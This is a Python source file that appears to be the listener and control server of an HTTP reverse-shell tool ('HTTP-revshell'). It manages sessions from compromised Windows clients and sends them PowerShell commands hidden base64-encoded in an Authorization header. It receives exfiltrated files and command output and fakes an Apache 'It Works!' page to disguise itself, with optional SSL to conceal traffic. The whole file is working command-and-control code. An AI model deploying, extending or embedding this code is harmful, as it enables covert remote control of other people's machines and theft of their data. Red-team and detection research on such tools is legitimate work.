#!/usr/bin/python3
import globals, certificate, modulescontroller
from Color import Color
from multisession_classes.menu import Menu
from multisession_classes.readline_functions import Readline_functions
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64, urllib.parse, time, readline, ssl, argparse, json
from pynput.keyboard import Key, Controller
import signal


readline.parse_and_bind("tab: complete")

class myHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.server_version = "Apache/2.4.18"
        self.sys_version = "(Ubuntu)"
        self.send_response(200)
        self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
        return

    def do_POST(self):
        self.server_version = "Apache/2.4.18"
        self.sys_version = "(Ubuntu)"
        self.send_response(200)
        html = "<html><body><h1>It Works!</h1></body></html>"
        client_ip = self.client_address[0]
        
        result, parser_type, client_id, json_response, color = self.parseResult()
        self.controlNewClients(client_id, client_ip, json_response)
        pwd = self.getPwd(json_response)

        if client_id == globals.CURRENT_CLIENT:
            if (self.isDownloadFunctCalled(json_response)):
                filename, content, output = self.parseDownload(json_response)
                try:
                    with open(filename, mode='wb') as file: # b is importante -> binary
                        content = base64.b64decode(content)
                        file.write(content)
                        print(Color.F_Green + output + Color.reset)
                except:
                    print (Color.F_Red + "\r\n[!] Error: Writing file!" + Color.reset)
            else:
                if ((json_response["result"] != json_response["pwd"]) and 
                ("InvokeWebRequestCommand" not in result) and
                ("WebCmdletWebResponseException" not in result)):
                    self.printResult(result, "F_" + color.capitalize())
            try:
                if (parser_type == "newclient"):
                    command = self.newCommand(pwd, True)
                elif ("InvokeWebRequestCommand" in result):
                    command = self.newCommand(pwd, False, True)
                else:
                    command = self.newCommand(pwd)
                self.sendCommand(command, html)
            except BrokenPipeError:
                pass
        if (parser_type == "newclient"):
            command = self.newCommand(pwd, True)
            self.sendCommand(command, html)
        return
        
    def controlNewClients(self, client_id, client_ip, json_response):
        if (client_id not in globals.CLIENT_DICT):
            hostname = base64.b64decode(json_response["hostname"]).decode('utf-8')
            username = base64.b64decode(json_response["cuser"]).decode('utf-8')
            if len(globals.CLIENT_DICT) == 0:
                globals.CLIENT_DICT[client_id] = {"session":1, "IP":client_ip, "hostname":hostname, "username":username, "client_id":client_id}
            else:
                globals.CLIENT_DICT[client_id] = {"session":list(globals.CLIENT_DICT.items())[-1][1]["session"] + 1, "IP":client_ip, "hostname":hostname, "username":username, "client_id":client_id}

        if len(globals.CLIENT_DICT) == 1:
            globals.CURRENT_CLIENT = list(globals.CLIENT_DICT.keys())[0] 

    def parseResult(self):
        test_data = self.rfile.read(int(self.headers['Content-Length']))
        client_id = self.headers['X-Request-ID']
        data = json.loads(test_data.decode('utf-8'))
        parser_type = data["type"]
        result = ""
        color = "white"
        client = self.client_address[0]

        if parser_type != "newclient":
            try:
                if (parser_type == "C0MM4ND"):
                    color = "white"
                elif (parser_type == "3RR0R"):
                    color = "red"
                else:
                    color = "green"
                
                result = urllib.parse.unquote(data["result"])
                result = (base64.b64decode(data["result"])).decode('utf-8')
            except:
                pass
        else:
            input(Color.F_Red + "[!] New Connection from {}, please press ENTER!".format(client) + Color.reset)
        
        return result, parser_type, client_id, data, color

    def parseDownload(self, json_result):
        downloaded_file_path = ""
        output = ""
        file_content = ""

        try:
            output = json_result["result"]
            downloaded_file_path = json_result["pathDst"]
            file_content = json_result["file"]
        except KeyError:
            pass

        return downloaded_file_path, file_content, output

    def getPwd(self, json_response):
        try:
            if json_response["pwd"]:
                pwd_decoded = base64.b64decode(json_response["pwd"].encode())
                pwd = pwd_decoded.decode('utf-8').strip()
        except KeyError:
            pwd_decoded = base64.b64decode(json_response["result"].encode())
            pwd = pwd_decoded.decode('utf-8').strip()
        return pwd

    def printResult(self, result, color):
        print(getattr(Color, color) + result + Color.reset)

    def isDownloadFunctCalled(self, json_response):
        iscalled = False
        try:
            if (json_response["type"] == "D0WNL04D" and json_response["file"]):
                iscalled = True
        except KeyError:
            pass
        return iscalled

    def newCommand(self, pwd, newclient=False, reconnect=False):
        command = ""
        try:
            if pwd != "":
                if (not newclient) and (not reconnect):
                    command = input(Color.F_Blue + "PS {}> ".format(pwd) + Color.reset)
                if command == "":
                    command = "pwd | Format-Table -HideTableHeaders"
            else:
                command = "pwd | Format-Table -HideTableHeaders"
        except EOFError:
            globals.KEY_PULSED = True
        return command

    def sendCommand(self, command, html, content=""):
        if (command != ""):
            command_list = command.split(" ")
            if command_list[0] in globals.MODULES.keys():
                html = modulescontroller.ModulesController(globals.MODULES,command_list, command)
                html = str(html)

            elif (command.split(" ")[0]) == "exit":
                # Delete current client from CLIENT_DICT
                del globals.CLIENT_DICT[globals.CURRENT_CLIENT]
                if len(globals.CLIENT_DICT) > 0:
                    globals.CURRENT_CLIENT = list(globals.CLIENT_DICT.keys())[0]
                    print(Color.F_Green + "[*] Session has been closed" + Color.reset)
                    print(Color.F_Yellow + "[!] WARNING: Session been changed to {}!".format(globals.CURRENT_CLIENT) + Color.reset)

            CMD = base64.b64encode(command.encode())
            self.send_header('Authorization',CMD.decode('utf-8'))
            self.end_headers()
            self.wfile.write(html.encode())


def handler(signum, frame):
    pass

if __name__ == "__main__":
    banner = """
██╗  ██╗████████╗████████╗██████╗   ██╗███████╗    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
███████║   ██║      ██║   ██████╔╝██╔╝ ███████╗    ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║
██╔══██║   ██║      ██║   ██╔═══╝██╔╝  ╚════██║    ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║
██║  ██║   ██║      ██║   ██║   ██╔╝   ███████║    ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝   ╚═╝    ╚══════╝    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                                         By: 3v4Si0N
    """
    print (Color.F_Yellow + banner + Color.reset)
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('host', help='Listen Host', type=str)
    parser.add_argument('port', help='Listen Port', type=int)
    parser.add_argument('--ssl', default=False, action="store_true", help='Send traffic over ssl')
    args = parser.parse_args()

    try:
        HOST = args.host
        PORT = args.port
        server = HTTPServer((HOST, PORT), myHandler)
        print(time.asctime(), 'Server UP - %s:%s' % (HOST, PORT))
        signal.signal(signal.SIGQUIT, handler)
        #MODULES = loadModules()
        globals.initialize() 

        if (args.ssl):
            cert = certificate.Certificate()
            if ((cert.checkCertPath() == False) or cert.checkCertificateExpiration()):
                cert.genCertificate()
            server.socket = ssl.wrap_socket (server.socket, certfile='certificate/cacert.pem', keyfile='certificate/private.pem', server_side=True)

        server.handle_request()
        rf = Readline_functions()
        menu = Menu()
        while True:
            readline.set_completer(rf.completer)
            readline.parse_and_bind("tab: complete")

            menu_command = input(Color.F_Yellow + "\nHTTP-revshell> " + Color.reset).split(" ")
            menu.construct_menu(menu_command, server)

    except KeyboardInterrupt:
        print (' received, shutting down the web server')
        server.server_close()
